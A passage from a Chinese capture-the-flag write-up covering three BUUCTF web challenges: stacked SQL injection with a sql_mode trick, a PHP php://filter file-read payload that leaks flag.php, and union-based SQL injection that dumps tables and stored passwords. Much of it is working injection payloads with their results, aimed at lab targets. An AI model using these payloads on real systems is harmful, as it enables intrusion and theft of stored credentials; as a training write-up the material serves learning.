查所有数据库,采用堆叠注入<br />`1;show databases;`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698665929401-d1ed791e-3482-437f-922e-d2013b67d69e.png#averageHue=%23f7f6f4&clientId=u0afe607f-2d1f-4&from=paste&height=175&id=u4356b753&originHeight=219&originWidth=1725&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36187&status=done&style=none&taskId=u11f7d0dc-8874-456c-b792-bd23c079d14&title=&width=1380)<br />查看所有数据表<br />`1;show tables;`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698733249276-b42032e3-6c64-471b-a9de-6a02dafdec20.png#averageHue=%23f9f8f7&clientId=u250485b3-3c63-4&from=paste&height=138&id=u666a75c4&originHeight=172&originWidth=748&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10564&status=done&style=none&taskId=ue2f2e90a-b7c3-402f-8ec9-55e97ce2274&title=&width=598.4)<br />尝试爆Flag数据表的字段<br />`1;show columns from Flag;`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698736004092-1706d5e8-718a-4c60-b84c-d8138080676f.png#averageHue=%23f5f3f1&clientId=u250485b3-3c63-4&from=paste&height=99&id=udd705357&originHeight=124&originWidth=506&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=6587&status=done&style=none&taskId=uc246e44f-a815-4917-8a0b-541bf4ebe3c&title=&width=404.8)
> 回显错误

到这里，大佬们直接猜出了后端语句<br />`select $_GET['query'] || flag from Flag`<br />我直接好家伙，大佬果然是大佬<br />||就是SQL里面的逻辑或运算符<br />**第一种解法 添加新列绕过逻辑或运算符：**<br />`*,1`<br />那么传到后端语句就是<br />`select *,1 || flag from Flag`<br />这里我问了下文心一言，看完我也理解了
> 这段SQL代码的含义是：从Flag表中选择所有的列，以及由列flag的值与数字1进行连接生成的新列。
> 具体来说：
> select *：选择所有的列。
> 1 || flag：这是SQL中的字符串连接操作。它将数字1与flag列的值进行连接。对于每一行，都会生成一个新的字符串，这个字符串是数字1后跟着flag列的值。如果flag列的值本身是一个字符串，那么这两个字符串将被连接起来。
> from Flag：从Flag表中选择数据。
> 因此，这段代码的输出结果将包含Flag表的所有列，以及一个名为“1”的列，该列的值是flag列的值与数字1的连接。

大致意思，就是查看数据表Flag的所有列内容，然后添加了一个由列flag的值与数字1进行连接生成的新列，这个新的列名就叫1，那么猜测或者说就是flag被过滤，我们还能查到flag列的值，因为flag的值复制到了新的列1。<br />`*,0`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698737425920-147348c3-d409-45b9-9b64-209c06dd4d8a.png#averageHue=%23f8f7f6&clientId=u250485b3-3c63-4&from=paste&height=138&id=u45a419d4&originHeight=172&originWidth=896&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12977&status=done&style=none&taskId=ub124435b-76cb-4bd6-adb0-d78454b724a&title=&width=716.8)<br />可以明显看到新的列名0和flag的值连接起来了<br />`*,1`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698737517157-c053430c-0783-483f-88da-60128f6c574b.png#averageHue=%23f9f8f7&clientId=u250485b3-3c63-4&from=paste&height=134&id=udcd5aa28&originHeight=168&originWidth=872&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11928&status=done&style=none&taskId=u24a871c4-5ee0-488d-ac55-0c5553132bc&title=&width=697.6)<br />对吧，新列名为1<br />`*,2`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698737591497-1936851a-330a-466f-a205-11b2f7e39480.png#averageHue=%23f8f7f6&clientId=u250485b3-3c63-4&from=paste&height=132&id=uc69c71a0&originHeight=165&originWidth=900&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12687&status=done&style=none&taskId=ua5ebc9c4-61a9-45ad-8be0-9b8ba35a996&title=&width=720)<br />还是为1，所有还可以看出Flag数据表的列只能是两个<br />**第二种解法 改逻辑或运算符为字符串连接符：**<br />既然题目内置的是逻辑或运算符，那咱们直接把它改成字符串连接符不就好了嘛（滑稽）<br />使用set方法定义sql_mode参数设置，PIPES_AS_CONCAT字符串连接符`select 1`查询第一列<br />`1;set sql_mode=PIPES_AS_CONCAT;select 1`<br />回显结果：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698738692889-3662a38c-076f-43de-88a8-67ac47a48fe4.png#averageHue=%23f5f3f0&clientId=u250485b3-3c63-4&from=paste&height=171&id=u8a1c556a&originHeight=214&originWidth=977&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29510&status=done&style=none&taskId=uf50e8da8-0feb-41e0-ae03-bd8c13b3cdc&title=&width=781.6)<br />可以明显看出解法1和解法2的回显结果有明显不同

## [极客大挑战 2019]Secret File 1

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698802561058-df9dbcb0-c223-4599-bf22-b7825a8b7b79.png#averageHue=%23151313&clientId=u6aca6dec-195b-4&from=paste&height=825&id=u779bc2c2&originHeight=1031&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=53498&status=done&style=none&taskId=u947f1f3c-f27b-4381-beb1-cd74d676462&title=&width=1536)
> 网页什么都没有，GET那里也没有任何参数和文件

F12查看隐藏文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698802688208-be6d23b9-75c2-40eb-ae11-8c5c3760004e.png#averageHue=%23fcfcfc&clientId=u6aca6dec-195b-4&from=paste&height=830&id=u0860aec4&originHeight=1037&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=70151&status=done&style=none&taskId=u7bf5aabf-05db-4fdc-a9a2-3cb71dc6cf2&title=&width=1536)<br />发现隐藏文件<br />点进去看看<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698802788222-bd753c39-1eff-4c6b-b23a-f24202e4a974.png#averageHue=%23171313&clientId=u6aca6dec-195b-4&from=paste&height=825&id=u0378a71f&originHeight=1031&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=56080&status=done&style=none&taskId=u4c306f61-256b-4256-a133-191d9de9c33&title=&width=1536)<br />发现一个可点击按钮<br />SECRET<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698802854946-c2b17583-2305-4bf1-910c-915bdd6b9cc6.png#averageHue=%23141313&clientId=u6aca6dec-195b-4&from=paste&height=822&id=u60eb6c89&originHeight=1028&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=45786&status=done&style=none&taskId=u111fc2c2-e5ad-4dda-b608-8cec62140f3&title=&width=1535.2)
> 好家伙，什么都没有

这里猜测还有隐藏文件<br />**目录扫描**<br />使用工具dirsearch<br />命令：<br />`python dirsearch.py -u [http://a9c9b5bd-4430-4ffb-88bf-0eec1fa73296.node4.buuoj.cn:81/](http://a9c9b5bd-4430-4ffb-88bf-0eec1fa73296.node4.buuoj.cn:81/)`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698804788439-b039270f-8428-4da1-afac-7a7bb9c2912b.png#averageHue=%230f0f0e&clientId=u6aca6dec-195b-4&from=paste&height=772&id=ua217e5a6&originHeight=965&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=174156&status=done&style=none&taskId=u422945eb-f5bb-4d5d-be60-c3994387044&title=&width=1536)![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698804818841-000fecd6-9f08-437c-9285-55a1c2210ac7.png#averageHue=%230c0c0c&clientId=u6aca6dec-195b-4&from=paste&height=841&id=uc1d652c0&originHeight=1051&originWidth=1899&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=210972&status=done&style=none&taskId=u82873de8-e4e8-4ad2-bc2c-3678c058ba1&title=&width=1519.2)<br />发现隐藏文件flag.php<br />补充一点，这里我用御剑没有扫描出来，不知道是什么问题，有知道的师傅还望解答，感谢！<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698804993824-1c0bdc7c-a27c-45b3-827a-0645dc86bcee.png#averageHue=%23f5f5f4&clientId=u6aca6dec-195b-4&from=paste&height=546&id=uddd97f24&originHeight=682&originWidth=926&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=50359&status=done&style=none&taskId=u0e3d0f84-b099-433e-a1c1-9aaf51da167&title=&width=740.8)<br />访问flag.php<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698805215622-6277b8d8-f984-478c-90a5-1099c2c10088.png#averageHue=%23161414&clientId=u6aca6dec-195b-4&from=paste&height=821&id=mjAVt&originHeight=1026&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=47930&status=done&style=none&taskId=ud50a1399-b00b-4a4d-a226-6b79885360a&title=&width=1536)<br />有内容但是flag没有显示出来，猜测flag是被编码了，需要用到PHP伪协议，但是不知道具体参数是什么，这里需要抓包<br />**burpsuite抓包**
> **使用火狐浏览器访问题目地址**

![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698806259228-9603c625-93cc-4d80-8e17-fcb117b698f8.png#averageHue=%23b16b14&clientId=u6aca6dec-195b-4&from=paste&height=724&id=uf50db427&originHeight=905&originWidth=1661&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=318116&status=done&style=none&taskId=u3283df3f-6a08-45f8-8ed8-33b0c4e1ec5&title=&width=1328.8)<br />点击SECRET进行抓包<br />右键后，Repeater进行重放<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698806416032-9d50525a-4531-491f-9356-a5604b6e82ba.png#averageHue=%23f6f6f6&clientId=u6aca6dec-195b-4&from=paste&height=602&id=u0e3ec928&originHeight=753&originWidth=1212&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=172200&status=done&style=none&taskId=uc6aea7b8-e32b-48e6-ac7b-9e246273310&title=&width=969.6)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698806467986-3b205469-8fe5-4a4a-9565-d07a6acf717a.png#averageHue=%23f6f6f6&clientId=u6aca6dec-195b-4&from=paste&height=586&id=ua96891c9&originHeight=733&originWidth=1249&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=192498&status=done&style=none&taskId=u2148daad-fe2c-4bc6-af59-5a2a947ef75&title=&width=999.2)<br />访问隐藏文件secr3t.php<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698806569686-6ac31c35-f565-4dd4-b5f4-505669086429.png#averageHue=%23fefdfd&clientId=u6aca6dec-195b-4&from=paste&height=558&id=u568efdad&originHeight=698&originWidth=1142&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=92793&status=done&style=none&taskId=u0c36c91d-ea42-4657-ad4c-0c364a2f907&title=&width=913.6)<br />strstr函数查询../,tp,input,data在file变量里面是否存在，存在则输出0h no!<br />这对构造PHP伪协议毫无影响<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698806818598-5a4461bb-97f7-46c4-84c9-a3273fd53e3a.png#averageHue=%23171515&clientId=u6aca6dec-195b-4&from=paste&height=826&id=ud73ea182&originHeight=1033&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75072&status=done&style=none&taskId=ud1237276-62a3-4c0d-8b42-1365129878b&title=&width=1536)
> 使用参数file访问flag.php文件
> 回显结果更是表明了flag.php文件内容被编码了

**构造PHP伪协议：**<br />`**php://filter/read=convert.base64-encode/resource=flag.php**`<br />**最终payload：**<br />`**URL/?file=php://filter/read=convert.base64-encode/resource=flag.php**`<br />**回显结果：**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698806980194-49f87555-3a9c-43cd-964d-822c6c6d0102.png#averageHue=%23fbfafa&clientId=u6aca6dec-195b-4&from=paste&height=408&id=u02767e88&originHeight=510&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=63379&status=done&style=none&taskId=u44a45d63-b891-4d3f-a9bd-a898ef7ecd8&title=&width=1536)<br />可以看到是明显的base64编码格式<br />放到Kali进行base64解码<br />`echo "PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZTI0OTJhMTktZDhjYi00OGYzLWIwOTctYjM0OGQyNjEwZmExfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=" | base64 -d`<br />回显结果：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698807140717-f0a0d0ce-9537-4a04-b06a-ba572356ed13.png#averageHue=%23202229&clientId=u6aca6dec-195b-4&from=paste&height=724&id=u766689ae&originHeight=905&originWidth=1661&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=248164&status=done&style=none&taskId=ufc308ba6-a62a-4a11-9b2b-42be83496e7&title=&width=1328.8)<br />**得出flag：**<br />`flag{e2492a19-d8cb-48f3-b097-b348d2610fa1}`

## [极客大挑战 2019]LoveSQL 1

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698909690636-861c392b-5073-4df5-8a76-4449c01db1c6.png#averageHue=%231f1f1f&clientId=u93f0fa3e-5d73-4&from=paste&height=825&id=u10ec8acf&originHeight=1031&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=597645&status=done&style=none&taskId=u8621b856-cfb9-441c-aba3-1d48365d194&title=&width=1534.4)判断注入类型<br />是否为数字型注入
> `admin`
> `1`

回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698909822674-6098ec0a-53be-4f1d-b49f-b46bf99dbf72.png#averageHue=%23241e1e&clientId=u93f0fa3e-5d73-4&from=paste&height=833&id=ufde74f60&originHeight=1041&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=606286&status=done&style=none&taskId=u3a7a0892-3a22-4e00-a2e6-e1c476a1cf5&title=&width=1536)
> 否

是否为字符型注入
> `admin`
> `1'`

回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698909907759-b0b66239-ffcf-4a5e-a80c-4134772788ab.png#averageHue=%231d1d1d&clientId=u93f0fa3e-5d73-4&from=paste&height=826&id=ua7cdc6f2&originHeight=1032&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=608102&status=done&style=none&taskId=ue4086c16-4114-4e3d-b8f4-f18afffe7de&title=&width=1536)
> 是

判断注入手法类型

> 使用堆叠注入
> 采用密码参数进行注入

爆数据库<br />`1'; show database();#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698910081201-ec66c41b-491a-4f7f-956f-41c24cf17780.png#averageHue=%231f1f1f&clientId=u93f0fa3e-5d73-4&from=paste&height=833&id=u6cca4a46&originHeight=1041&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=609596&status=done&style=none&taskId=ubd1cc3e5-f6c7-4fc9-9899-da9eb316751&title=&width=1536)
> 这里猜测注入语句某字段被过滤，或者是';'被过滤导致不能堆叠注入

爆字段数<br />`1';order by 4#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698910291949-9d34bc6b-f088-43dd-ae34-9cb3d98a6e41.png#averageHue=%231e1e1e&clientId=u93f0fa3e-5d73-4&from=paste&height=828&id=ue653c0b2&originHeight=1035&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=609461&status=done&style=none&taskId=u014c81be-9a36-4a0c-91c0-a33f4b83262&title=&width=1536)
> 报错
> 抛弃堆叠注入

**步入正题**<br />`1' order by 4#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698910383188-ae75dce9-d7c8-4dd4-b815-71fb6ba05d21.png#averageHue=%231e1e1d&clientId=u93f0fa3e-5d73-4&from=paste&height=830&id=u5a0a5819&originHeight=1037&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=600087&status=done&style=none&taskId=u58510ae9-b899-4664-bbc6-cd4a4a0d405&title=&width=1536)
> 成功，但是不存在第4列
> 同时验证了猜想不能使用堆叠注入

继续判断列数<br />`1' order by 3#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698910478755-1e7e63c9-0354-45a3-abc2-2f6f535e0003.png#averageHue=%23221c1c&clientId=u93f0fa3e-5d73-4&from=paste&height=826&id=u0c2aade0&originHeight=1033&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=605355&status=done&style=none&taskId=ue936570e-9310-42eb-9dbc-a98cbc98a60&title=&width=1536)
> 可知列数只有3列

爆数据库<br />使用联合查询<br />`1' union select 1,2,database()#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698910666459-6a3a6b11-fa82-4b48-ad00-31c05b76c161.png#averageHue=%231f1e1e&clientId=u93f0fa3e-5d73-4&from=paste&height=831&id=u731be2bc&originHeight=1039&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=617140&status=done&style=none&taskId=u91b4f4eb-e65b-471e-a60a-1c63c12e91d&title=&width=1536)<br />爆数据表<br />`1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698911070730-12c0a4b1-543d-46c5-9f8b-3b8623ab9df2.png#averageHue=%231e1e1d&clientId=u93f0fa3e-5d73-4&from=paste&height=829&id=u7b0fd8e4&originHeight=1036&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=623639&status=done&style=none&taskId=udc09894c-f0b0-4554-92c7-b9b241f8f57&title=&width=1536)
> 爆出两个表
> 开始爆数据表的字段
> 按照先后顺序把，先爆第一个

爆geekuser数据表的字段<br />`1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='geekuser'#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698911854728-50b4b69b-1a11-4896-b284-af320e648a7e.png#averageHue=%23201f1f&clientId=u93f0fa3e-5d73-4&from=paste&height=833&id=u295cb7ff&originHeight=1041&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=613173&status=done&style=none&taskId=udcf4212e-cce5-446d-8c80-c0856916610&title=&width=1536)
> 字段：id、username、password

爆geekuser数据表的所有内容<br />`1' union select 1,database(),group_concat(id,username,password) from geekuser#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698912168291-6e041779-91e5-4a60-a71c-6234905cdde4.png#averageHue=%23201f1f&clientId=u93f0fa3e-5d73-4&from=paste&height=834&id=u67d2e3eb&originHeight=1042&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=618210&status=done&style=none&taskId=u69c75f31-d772-4757-b782-116847fb745&title=&width=1536)
> 无flag

转手数据表l0ve1ysq1<br />步骤和数据表geekuser一样，这里直接爆数据表l0ve1ysq1的flag值<br />`1' union select 1,database(),group_concat(password) from l0ve1ysq1#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698912423460-3c81bdee-fb79-40c6-a33f-77d1ef31e897.png#averageHue=%23242322&clientId=u93f0fa3e-5d73-4&from=paste&height=828&id=u6276eb70&originHeight=1035&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=630684&status=done&style=none&taskId=uad685c97-2037-4584-b5df-0a79cd79221&title=&width=1536)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698912445735-b36fc7d2-cb85-49a3-a1bf-e1d6f21d01e5.png#averageHue=%23222222&clientId=u93f0fa3e-5d73-4&from=paste&height=826&id=u20939a6e&originHeight=1033&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=613901&status=done&style=none&taskId=ua38fbf35-d9a8-422a-b92e-f8170c73537&title=&width=1536)<br />**得出flag：**<br />`flag{3c4b1ff9-6685-4dcb-853e-06093c1e4040}`
原文链接：https://blog.csdn.net/m0_73734159/article/details/134185235?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22134185235%22%2C%22source%22%3A%22m0_73734159%22%7D









